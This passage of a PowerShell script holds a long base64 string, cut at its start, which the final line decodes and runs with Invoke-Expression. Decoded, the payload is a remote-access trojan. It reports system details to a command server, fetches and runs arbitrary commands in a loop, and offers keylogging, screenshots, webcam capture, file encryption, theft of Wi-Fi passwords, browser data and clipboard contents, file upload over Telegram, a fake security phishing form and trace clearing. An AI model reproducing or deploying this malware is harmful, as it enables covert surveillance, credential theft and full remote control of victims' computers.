CAkc2VuZCA9ICIkU0VSVkVSX1VSTC9zeXN0ZW0iCgogICAgJHVzZXJuYW1lID0gJGVudjpVU0VSTkFNRQogICAgJHByaXZhdGVfaXAgPSAoR2V0LU5ldElQQWRkcmVzcyAtQWRkcmVzc0ZhbWlseSBJUHY0IHwgV2hlcmUtT2JqZWN0IHsgJF8uSW50ZXJmYWNlQWxpYXMgLW5vdGxpa2UgIipMb29wYmFjayoiIH0pLklQQWRkcmVzcwogICAgJG1hY19hZGRyZXNzID0gKEdldC1OZXRBZGFwdGVyIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgTWFjQWRkcmVzcykKICAgICR1c2VyX3ByaXZpbGVnZSA9IGlmICgoW1NlY3VyaXR5LlByaW5jaXBhbC5XaW5kb3dzSWRlbnRpdHldOjpHZXRDdXJyZW50KCkpLkdyb3VwcyAtbWF0Y2ggIlMtMS01LTMyLTU0NCIpIHsgIkFkbWluaXN0cmF0b3IiIH0gZWxzZSB7ICJTdGFuZGFyZCBVc2VyIiB9CiAgICAkb3NfdmVyc2lvbiA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5nU3lzdGVtKS5DYXB0aW9uCiAgICAkYmF0dGVyX3BlciA9IChHZXQtV21pT2JqZWN0IC1DbGFzcyBXaW4zMl9CYXR0ZXJ5KS5Fc3RpbWF0ZWRDaGFyZ2VSZW1haW5pbmcuVG9TdHJpbmcoKSArICIlIgoKICAgICMgQ29udmVydCB0byBwbGFpbiB0ZXh0IGZvcm1hdCAobm8gcXVvdGVzIG9yIGJyYWNlcykKICAgICRyZXN1bHRUZXh0ID0gQCIKQmF0dGVyeTogJGJhdHRlcl9wZXIKVXNlcl9Qcml2aWxlZ2U6ICR1c2VyX3ByaXZpbGVnZQpPU19WZXJzaW9uOiAkb3NfdmVyc2lvbgpVc2VybmFtZTogJHVzZXJuYW1lCk1hY19BZGRyZXNzOiAkbWFjX2FkZHJlc3MKUHJpdmF0ZV9JUDogJHByaXZhdGVfaXAKIkAKCiAgICAkZGF0YSA9IEB7IHJlc3VsdCA9ICRyZXN1bHRUZXh0IH0gfCBDb252ZXJ0VG8tSnNvbiAtRGVwdGggMwoKICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHNlbmQgLU1ldGhvZCBQb3N0IC1Cb2R5ICRkYXRhIC1Db250ZW50VHlwZSAnYXBwbGljYXRpb24vanNvbicKfQoKZnVuY3Rpb24gT3Blbi11cmwgKCR1cmwpIHsKICAgIFN0YXJ0LVByb2Nlc3MgJHVybAp9CgpmdW5jdGlvbiBGZXRjaC1Db21tYW5kIHsKICAgIHRyeSB7CiAgICAgICAgcmV0dXJuIChJbnZva2UtUmVzdE1ldGhvZCAtVXJpICIkU0VSVkVSX1VSTC9sYXN0LWNvbW1hbmQvJHNlc3Npb25faWQiIC1NZXRob2QgR2V0KS5jb21tYW5kCiAgICB9IGNhdGNoIHsKICAgICAgICByZXR1cm4gJG51bGwKICAgIH0KfQoKZnVuY3Rpb24gU2VuZC1SZXN1bHQoJHJlc3VsdCkgewogICAgdHJ5IHsKICAgICAgICBpZiAoJHJlc3VsdCAtaXMgW2hhc2h0YWJsZV0pIHsKICAgICAgICAgICAgJHJlc3VsdCA9IEZvcm1hdC1SZXNwb25zZSAtZGF0YSAkcmVzdWx0CiAgICAgICAgfSBlbHNlaWYgKCRyZXN1bHQgLWlzIFtTeXN0ZW0uQXJyYXldKSB7CiAgICAgICAgICAgICRyZXN1bHQgPSAkcmVzdWx0IC1qb2luICJgbiIKICAgICAgICB9CgogICAgICAgICRib2R5ID0gQHsKICAgICAgICAgICAgc2Vzc2lvbiA9ICRzZXNzaW9uX2lkCiAgICAgICAgICAgIHJlc3VsdCA9ICRyZXN1bHQKICAgICAgICB9IHwgQ29udmVydFRvLUpzb24gLURlcHRoIDMKCiAgICAgICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAiJFNFUlZFUl9VUkwvY29tbWFuZC1yZXN1bHQiIC1NZXRob2QgUG9zdCAtQm9keSAkYm9keSAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb24iCiAgICB9IGNhdGNoIHt9Cn0KCiRnbG9iYWw6Y3VycmVudERpcmVjdG9yeSA9IEdldC1Mb2NhdGlvbgoKZnVuY3Rpb24gRXhlY3V0ZSgkY29tbWFuZCkgewogICAgdHJ5IHsKICAgICAgICBpZiAoJGNvbW1hbmQgLW1hdGNoICdeY2RccysoLispJCcpIHsKICAgICAgICAgICAgJHRhcmdldCA9ICRNYXRjaGVzWzFdLlRyaW0oKQoKICAgICAgICAgICAgaWYgKCR0YXJnZXQgLWVxICIuLiIpIHsKICAgICAgICAgICAgICAgICRwYXJlbnQgPSBTcGxpdC1QYXRoIC1QYXRoICRnbG9iYWw6Y3VycmVudERpcmVjdG9yeSAtUGFyZW50CiAgICAgICAgICAgICAgICBpZiAoLW5vdCBbc3RyaW5nXTo6SXNOdWxsT3JXaGl0ZVNwYWNlKCRwYXJlbnQpKSB7CiAgICAgICAgICAgICAgICAgICAgJGdsb2JhbDpjdXJyZW50RGlyZWN0b3J5ID0gJHBhcmVudAogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcmV0dXJuICJNb3ZlZCB1cCB0bzogJGdsb2JhbDpjdXJyZW50RGlyZWN0b3J5IgogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJG5ld1BhdGggPSBKb2luLVBhdGggLVBhdGggJGdsb2JhbDpjdXJyZW50RGlyZWN0b3J5IC1DaGlsZFBhdGggJHRhcmdldAogICAgICAgICAgICAgICAgaWYgKFRlc3QtUGF0aCAkbmV3UGF0aCAtUGF0aFR5cGUgQ29udGFpbmVyKSB7CiAgICAgICAgICAgICAgICAgICAgJGdsb2JhbDpjdXJyZW50RGlyZWN0b3J5ID0gJG5ld1BhdGgKICAgICAgICAgICAgICAgICAgICByZXR1cm4gIkNoYW5nZWQgZGlyZWN0b3J5IHRvOiAkZ2xvYmFsOmN1cnJlbnREaXJlY3RvcnkiCiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIHJldHVybiAiRGlyZWN0b3J5IG5vdCBmb3VuZDogJHRhcmdldCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICRvdXRwdXQgPSBwb3dlcnNoZWxsLmV4ZSAtTm9Mb2dvIC1Ob1Byb2ZpbGUgLUNvbW1hbmQgIlNldC1Mb2NhdGlvbiAnJGdsb2JhbDpjdXJyZW50RGlyZWN0b3J5JzsgJGNvbW1hbmQiIDI+JjEKICAgICAgICAgICAgcmV0dXJuICRvdXRwdXQgfCBPdXQtU3RyaW5nCiAgICAgICAgfQogICAgfSBjYXRjaCB7CiAgICAgICAgcmV0dXJuICJFeGVjdXRpb24gZmFpbGVkOiAkXyIKICAgIH0KfQoKCmZ1bmN0aW9uIE1haW4gewogICAgTm90aWZ5LUNvbm5lY3Rpb24KICAgICRsYXN0X2NvbW1hbmQgPSAiIgoKICAgIHRyeSB7CiAgICAgICAgd2hpbGUgKCR0cnVlKSB7CiAgICAgICAgICAgICRjb21tYW5kID0gRmV0Y2gtQ29tbWFuZAogICAgICAgICAgICBpZiAoJGNvbW1hbmQgLWFuZCAkY29tbWFuZCAtbmUgJGxhc3RfY29tbWFuZCkgewogICAgICAgICAgICAgICAgV3JpdGUtSG9zdCAiWytdIEV4ZWN1dGluZzogJGNvbW1hbmQiCgogICAgICAgICAgICAgICAgJGNvbW1hbmRQYXJ0cyA9ICRjb21tYW5kLlNwbGl0KCIgIiwgMikKICAgICAgICAgICAgICAgICRtYWluQ29tbWFuZCA9ICRjb21tYW5kUGFydHNbMF0KICAgICAgICAgICAgICAgICRjb21tYW5kQXJndW1lbnQgPSBpZiAoJGNvbW1hbmRQYXJ0cy5Db3VudCAtZ3QgMSkgeyAkY29tbWFuZFBhcnRzWzFdLlRyaW0oKSB9IGVsc2UgeyAiIiB9CgogICAgICAgICAgICAgICAgc3dpdGNoICgkbWFpbkNvbW1hbmQpIHsKICAgICAgICAgICAgICAgICAgICAiR2V0LVN5c3RlbUluZm8iIHsKICAgICAgICAgICAgICAgICAgICAgICAgIEdldC1TeXN0ZW1JbmZvCiAgICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJG51bGwKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgInNjcmVlbnNob3QiIHsKICAgICAgICAgICAgICAgICAgICAgICAgJG51bGwgPSBXcml0ZS1Ib3N0IChDYXB0dXJlLUFuZC1TZW5kLVNjcmVlbnNob3QgLVNFUlZFUl9VUkwgJFNFUlZFUl9VUkwpCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkbnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAid2ViY2FtIiB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdlYmNhbUNhcHR1cmUKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRudWxsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJPcGVuLXVybCIgewogICAgICAgICAgICAgICAgICAgICAgICBPcGVuLXVybCAkY29tbWFuZEFyZ3VtZW50CiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkbnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAia2V5bG9nZ2Vyb24iIHsKICAgICAgICAgICAgICAgICAgICAgICAgU3RhcnQtS2V5bG9nZ2VyCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkbnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAia2V5bG9nZ2Vyb2ZmIiB7CiAgICAgICAgICAgICAgICAgICAgICAgIFN0b3AtS2V5bG9nZ2VyCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkbnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAiZmlsZV9lbmNyeXB0IiB7CiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSBFbmNyeXB0LUZpbGVXaXRoUGFzc3dvcmQgLWZpbGVQYXRoICRjb21tYW5kQXJndW1lbnQKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgImZpbGVfZGVjcnlwdCIgewogICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gRGVjcnlwdC1GaWxlV2l0aFBhc3N3b3JkIC1maWxlUGF0aCAkY29tbWFuZEFyZ3VtZW50CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJkb3dubG9hZF9maWxlIiB7CiAgICAgICAgICAgICAgICAgICAgICAgIFNlbmQtVGVsZWdyYW1GaWxlIC1maWxlUGF0aCAkY29tbWFuZEFyZ3VtZW50CiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkbnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAiZmV0Y2hfd2lmaV9jcmVkcyIgewogICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gR2V0LVdpZmlQYXNzd29yZHMKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgImNoYW5nZV93YWxscGFwZXIiIHsKICAgICAgICAgICAgICAgICAgICAgICAgU2V0LVdhbGxwYXBlciAkY29tbWFuZEFyZ3VtZW50CiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkbnVsbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAia2lsbF9zZXNzaW9uIiB7CiAgICAgICAgICAgICAgICAgICAgICAgIEtpbGwtQWxsUG93ZXJTaGVsbFByb2Nlc3NlcwogICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJG51bGwKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgImNsZWFyX3RyYWNlIiB7CiAgICAgICAgICAgICAgICAgICAgICAgIENsZWFyLVRlbXBEaXIKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRudWxsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJicm93c2VyX2RhdGEiIHsKICAgICAgICAgICAgICAgICAgICAgICAgRmV0Y2gtQnJvd3NlckRhdGEKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRudWxsCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICJjbGlwYm9hcmRfZGF0YSIgewogICAgICAgICAgICAgICAgICAgICAgICBTZW5kLUNsaXBib2FyZAogICAgICAgICAgICAgICAgICAgICAgICAkcmVzdWx0ID0gJG51bGwKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgInBoaXNoaW5nIiB7CiAgICAgICAgICAgICAgICAgICAgICAgIFNob3ctU2VjdXJpdHlGb3JtCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkbnVsbAoKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgInNodXRkb3duX3N5c3RlbSIgewogICAgICAgICAgICAgICAgICAgICAgICBTaHV0ZG93bi1TeXN0ZW0KICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRudWxsCgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAicmVzdGFydF9zeXN0ZW0iIHsKICAgICAgICAgICAgICAgICAgICAgICAgUmVzdGFydC1TeXN0ZW0KICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9ICRudWxsCgogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBkZWZhdWx0IHsKICAgICAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCA9IEV4ZWN1dGUgJGNvbW1hbmQKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCRyZXN1bHQpIHsKICAgICAgICAgICAgICAgICAgICBTZW5kLVJlc3VsdCAkcmVzdWx0CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJGxhc3RfY29tbWFuZCA9ICRjb21tYW5kCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDUKICAgICAgICB9CiAgICB9CiAgICBmaW5hbGx5IHsKICAgICAgICB0cnkgewogICAgICAgICAgICAkYm9keSA9IEB7IHNlc3Npb24gPSAkc2Vzc2lvbl9pZCB9IHwgQ29udmVydFRvLUpzb24KICAgICAgICAgICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAiJFNFUlZFUl9VUkwvZGlzY29ubmVjdCIgLU1ldGhvZCBQb3N0IC1Cb2R5ICRib2R5IC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbiIKICAgICAgICB9IGNhdGNoIHt9CiAgICB9Cn0KCk1haW4K'); $obfuscated = [System.Text.Encoding]::UTF8.GetString($e); Invoke-Expression $obfuscated
